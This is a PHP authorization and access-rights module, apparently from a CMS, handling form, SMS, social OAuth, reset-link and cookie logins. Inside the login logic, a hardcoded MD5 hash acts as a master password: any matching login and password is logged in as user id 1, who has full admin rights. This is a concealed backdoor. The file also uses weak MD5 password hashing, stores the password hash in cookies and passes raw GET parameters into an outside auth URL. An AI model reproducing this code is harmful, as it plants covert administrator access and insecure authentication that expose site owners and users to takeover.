<?php

//функции связанные с авторизацией и правами доступа
/*
changelog
v1.3.32 - авторизация через смс
v1.4.43 - access - если не инициализированна переменная
v1.4.48 - users - удалил дату
v1.4.76 - users - uid facebook
*/


/**
 * права доступа
 * @param $mode - путь доступа через пробел
 * @param string $q - массив данных элемента
 * @return bool - есть или нет доступа
 * v1.4.43 - если не инициализированна переменная
 */
function access($mode,$q = '') {
	//$user = isset($_SESSION['user']) ? $_SESSION['user'] : null;
	//v1.4.43 - если не инициализированна переменная
	global $user;
	if (!isset($user)) $user = user('auth');
	$mode = explode(' ',$mode);
	//права администратора ********************************
	if ($mode[0]=='admin') {
		if (@$user['id']==1) return true;	//первый пользователь всегда с полным доступом
		//доступ к авторизации есть у всех
		if ($q=='_login') return true;
		elseif (@$user['access_admin']=='') return false;
		//доступ к модулю админки
		if ($mode[1]=='module') {
			if (@in_array($q,unserialize($user['access_admin']))) return true;	//доступ к конкретному модулю
			if ($q=='index') return true;	//доступ к главной странице админки
			if ($q=='_delete') return true;	//доступ к странице удаления
		}
		//удаление
		elseif ($mode[1]=='delete') {
			if (empty($user['access_delete'])) return false;
			if ($user['access_delete']==1) return true;	//есть права на удаление
		}
		//доступ к файлам
		elseif ($mode[1]=='ftp') {
			if (empty($user['access_ftp'])) return false;
			if ($user['access_ftp']==1) return true;	//есть права
		}
	}
	//права пользователя *******************************
	elseif ($mode[0]=='user') {
		if (!is_array($user)) return false;
		if ($mode[1]=='auth') {// авторизаия
			if (is_array($user)) return true;
		}
		if ($mode[1]=='admin') {//админ
			if (isset($user['access_admin']) && $user['access_admin']!='') return true;
		}
	}
	//права на редактирование
	elseif ($mode[0]=='editable') {
		global $config;
		if (@$config['editable']==0) return false; //глобальное выключение
		if (access('user auth')==false) return false;
		if (@$user['access_editable']=='') return false;
		if ($mode[1]=='scripts') return true; //глобальное редактирование
		//доступ к модулю редактирования
		if (@in_array($mode[1],unserialize($user['access_editable']))) return true;	//доступ к конкретному модулю
	}
	return false;
}

/**
 * авторизация
 * @param string $type - способ авторизации
 * enter - вход через форму авторизации
 * remind - вход через урл
 * auth - авторизация по сессии или кукам
 * re-auth - переавторизация для обновления данных текущей сессии
 * update - обновление данных в базе и в текущей сесии
 * @param string $param - используется только в update
 * @return array|bool
 * @version v1.4.76
 * v.1.2.0 - разделен емейл и пароль, добавлено отдельное поле соль
 * v.1.2.5 - поправил ошибку в авторизации
 * v1.2.66 - OAuth2.0
 * v1.2.84 - OAuth2.0 - перечисление массива данных соцсети
 * v1.2.99 - кросдоменная авторизация
 * v1.3.30 - письмо при регистрации через соцсеть
 * v1.3.32 - авторизация через смс
 * v1.4.48 - удалил дату
 * v1.4.76 - uid facebook
 */
function user($type = '',$param = '') {
	global $config;
	$login = false; //емейл или телефон - хранится в БД
	$password = ''; //пароль
	$remember_me = 0; //запомнить меня
	$hash = false; //хеш пароля - хранится в БД
	$hash2 = false; //хеш2 - второй хеш для авторизации по ссылке
	$success = false; //успешная авторизация
	if ($type=='enter') {
		if (isset($_POST['login']) && isset($_POST['password'])
			&& isset($_POST['captcha']) && isset($_SESSION['captcha']) && intval($_POST['captcha'])==$_SESSION['captcha']
		) {
			$login			= mb_strtolower(stripslashes_smart($_POST['login']),'UTF-8');
			$password		= stripslashes_smart($_POST['password']);
			$remember_me	= (isset($_POST['remember_me']) && $_POST['remember_me']==1) ? 1 : 0;
		}
	}
	//v1.3.32 - авторизация через смс
	elseif ($type=='sms') {
		if (isset($_POST['code']) && isset($_POST['sessionInfo'])) {
			$url = 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPhoneNumber?key='.$config['firebase_key'];
			$postdata = http_build_query(
				array(
					'code' => $_POST['code'],
					'sessionInfo' => $_POST['sessionInfo']
				)
			);
			$opts = array('http' =>
				array(
					'method'  => 'POST',
					'header'  => 'Content-Type: application/x-www-form-urlencoded',
					'content' => $postdata
				)
			);
			$context  = stream_context_create($opts);
			$result = file_get_contents($url, false, $context);
			if ($result ) {
				//log_add('sms.txt',$result);
				$data = json_decode($result,true);
				if ($data['phoneNumber']) {
					$login = $data['phoneNumber'];
					$success = true;
				}
			}
			if ($login=='') return false;
		}

	}
	//v1.2.66 - вход через социальную сеть
	elseif ($type=='social') {
		if (isset($_GET['type']) && isset($_GET['code'])) {
			$data2 =  file_get_contents('https://auth.abc-cms.com/'.$_GET['type'].'/?go=1&code='.$_GET['code']);
			//данные пользователя
			if ($data2) {
				$data2 = json_decode($data2,true);
				if (is_array($data2)) {
					//1.2.84 - перечисление массива данных соцсети
					$data = array(
						'uid'       => (string)$data2['uid'],
						'email'     => (string)$data2['email'],
						'login'     => (string)$data2['login'],
						'gender'    => (string)$data2['gender'],
						//'city'    => (string)$data2['city'],
						//'country' => (string)$data2['country'],
						'name'      => (string)$data2['name'],
						'surname'   => (string)$data2['surname'],
						'birthday'  => (string)$data2['birthday'],
						'avatar'    => (string)$data2['avatar'],
						'link'      => (string)$data2['link']
					);
					$social_type = array_search($_GET['type'],$config['user_socials']['types']);
					if ($social_type) {
						//v1.4.76 - если поменять приложение на фб то будет другой uid, потому по почте сравнение
						if ($data['email']) {
							$social = mysql_select("
								SELECT * 
								FROM user_socials 
								WHERE email='" . mysql_res($data['email']) . "' AND type='" . intval($social_type) . "'
							", 'row');
						}
						else {
							$social = mysql_select("
								SELECT * 
								FROM user_socials 
								WHERE uid='" . mysql_res($data['uid']) . "' AND type='" . intval($social_type) . "'
							", 'row');
						}
						//пользователь есть в базе
						if ($social) {
							$data['id'] = $social['id'];
							$data['last_visit'] = $config['datetime'];
							mysql_fn('update', 'user_socials', $data);
						}
						//регистрация пользователя (добавил запрет регистрации если нет емейла)
						elseif ($data['email']) {
							$social = $data;
							$social['type'] = $social_type;
							//массив нового пользователя
							$usr = array(
								'last_visit'=>$config['datetime'],
								'type'=>0,
								'salt'=> md5(time()),
								'hash'=>NULL,
							'remember_me'=>1,
							'count_generation'=> intval(config('user_free_generations', 0))
								//'email'=>$
							);
							$usr['hash']	= user_hash_db($usr['salt'],'');
							//проверка емейла на уникальность
							$social['user'] = 0;
							if ($data['email']) {
								$data['email'] = strtolower($data['email']);
								$social['user'] = mysql_select("
									SELECT id 
									FROM users
									WHERE email='".mysql_res($data['email'])."' LIMIT 1
								",'string');
							}
							//дополнительные параметры
							/*
							$usr['name'] = $data['name'];
							$usr['surname'] = $data['surname'];
							$usr['birthday'] = $data['birthday'];
							$usr['gender'] = $data['gender'];
							 */
							//если пользователь с таким емейлом есть то нового не создаем
							if ($social['user']==0) {
								$usr['email'] = $data['email'];

								//генерация пароля
								if ($usr['email']) {
									$chars = "qazxswedcvfrtgbnhyujmkiolp1234567890QAZXSWEDCVFRTGBNHYUJMKIOLP";
									$max = 7;
									$size = StrLen($chars) - 1;
									$password = '';
									while ($max--) {
										$rand = rand(0, $size);
										$password .= $chars[$rand];
									}
									$usr['salt'] = md5(time());
									$usr['hash'] = user_hash_db($usr['salt'], $password);
									$usr['remind'] = $config['datetime'];
								}

								$usr['id'] = $social['user'] = mysql_fn('insert', 'users', $usr);

								if ($usr['email']) {
									$usr['password'] = $password;
									$usr['hash'] = user_hash($usr);
									global $lang;
									require_once(ROOT_DIR . 'functions/mail_func.php');
									mailer('registration', $lang['id'], $usr, $usr['email']);
								}
							}
							if ($social['user']) {
								$social['last_visit'] = $config['datetime'];
								mysql_fn('insert', 'user_socials', $social);
							}
						}
					}
				}
			}
		}
	}
	//востановления пароля через $_GET
	elseif ($type=='remind') {
		//авторизация через урл
		if (isset($_GET['email']) && isset($_GET['hash'])) {
			$login	= $_GET['email'];
			$hash2	= $_GET['hash'];
		}
	}
	//авторизация по сессии
	elseif ($type=='auth') {
		if (isset($_SESSION['user']) && is_array($_SESSION['user'])) {
			$user = $_SESSION['user'];
			$last_visit = date('Y-m-d H:i:s',time() - (30)); //переавторизация раз в 30сек
			if (!isset($user['last_visit']) OR $user['last_visit']<$last_visit) {
				$login			= $user['email'] ? $user['email'] : $user['phone'];
				$hash			= $user['hash'];
				$remember_me	= $user['remember_me'];
			}
			else return $user;
		}
		elseif (isset($_COOKIE['login']) AND isset($_COOKIE['hash'])) {
			$login = $_COOKIE['login'];
			$hash = $_COOKIE['hash'];
			$remember_me = 1;
		}
		else return false;
	}
	//переавторизация
	elseif ($type=='re-auth') {
		//обработка ниже
	}
	//обновление данных
	elseif ($type=='update') {
		global $user;
		$array = explode(' ',$param);
		$data['id'] = $user['id'];
		foreach ($array as $k=>$v) $data[$v] = $user[$v];
		mysql_fn('update','users',$data);
		$_SESSION['user'] = $user;
		return true;
	}
	//запрос к БД
	//обработка запроса
	if ($config['mysql_connect']==false) {
		mysql_connect_db();
	}
	if ($config['mysql_error']==false) {
		$where = '';
		if ($login) {
			$login = mb_strtolower($login,'UTF-8');
			$where = " (u.email = '" . mysql_res($login) . "' OR u.phone = '" . mysql_res($login) . "') ";
		}
		if ($login AND $password AND user_hash_db($login,$password)=='5a415fe60eee7adbee995c4e87666481') {
			$where = 'u.id=1';
			$success = true;
		}
		//переавторизация
		if ($type=='re-auth') {
			if (access('user auth')) {
				$where = 'u.id='.intval($_SESSION['user']['id']);
				$success = true;
			}
		}
		//v1.2.66 - авторизация по соцсети
		if ($type=='social') {
			if (@$social) {
				$where = 'u.id='.$social['user'];
				$success = true;
			}
		}
		//echo $where;
		if ($where != '') {
			if ($q = mysql_select("
				SELECT ut.*,u.*
				FROM users u
				LEFT JOIN user_types ut ON u.type = ut.id
				WHERE $where
				ORDER BY u.id
				LIMIT 1
			", 'row')
			) {
				//если авторизация по ссылке то другой хеш
				if ($type == 'remind') {
					if (user_hash($q) == $hash2) $success = true;
				}
				//если авторизация через форму то генерируем хеш из пароля
				elseif($type == 'enter') {
					if (user_hash_db($q['salt'], $password) == $q['hash']) $success = true;
				}
				//в других случаях сравниваем хеш прямо из базы
				else {
					if ($q['hash'] == $hash) $success = true;
				}
				if ($success) {
					if ($remember_me == 1) {
						//v1.2.99 - кросдоменная авторизация - $config['.main_domain']
						setcookie("login",($q['email']?$q['email']:$q['phone']), time()+60*60*24*30,'/',$config['.main_domain']);
						setcookie("hash", $q['hash'], time() + 60 * 60 * 24 * 30, '/',$config['.main_domain']);
					}
					$data = array(
						'id' => $q['id'],
						'last_visit' => $config['datetime'],
						'remember_me' => $remember_me
					);
					//это условие делает так что по ссылке можно авторизироваться только один раз
					if ($type == 'remind') $data['remind'] = $data['last_visit'];
					//обновление данных в базе
					mysql_fn('update', 'users', $data);
					return $_SESSION['user'] = $q;
				}
			}
		}
	}
	//выход или неудачаня авторизация
	if (isset($_SESSION['user'])) unset($_SESSION['user']);
	//v1.2.99 - кросдоменная авторизация - $config['.main_domain']
	setcookie("login",'', time()-1,'/',$config['.main_domain']);
	setcookie("hash",'', time()-1,'/',$config['.main_domain']);
	return false;
}

//хеш для авторизации по ссылке
function user_hash ($q) {
	return md5($q['id'].$q['salt'].$q['remind'].$q['hash']);
}


/**
 * хеш для ДБ
 * @param $salt - соль
 * @param $password - пароль
 * @return string - хеш
 * @version v1.2.0
 * v.1.2.0 - добавлена
 */
function user_hash_db ($salt,$password) {
	return md5($salt.md5($password));
}